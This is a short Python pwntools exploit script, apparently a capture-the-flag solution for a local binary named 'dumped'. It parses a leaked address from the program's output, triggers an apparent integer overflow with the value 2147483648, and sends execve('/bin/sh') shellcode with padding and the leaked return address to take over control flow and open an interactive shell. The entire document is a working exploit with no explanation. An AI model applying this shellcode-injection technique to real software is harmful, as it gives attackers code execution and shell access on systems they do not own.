
import pwn
from pwn import *

p = process("./dumped")
context.binary = "dumped"
context.arch ="amd64"
leak = p.recv(2653) [-14:]
leak = int(leak, base=16)
offset = 105


p.sendafter(b"throwing: ",b"2147483648")
shellcode = asm("""
mov rax, 59 
mov rbx, 0x68732f6e69622f
push rbx
mov rdi, rsp
mov rsi, 0
mov rdx, 0
syscall
""")
payload =  shellcode
payload += b"A"*68
payload += p64(leak)

p.send(payload)
p.interactive()
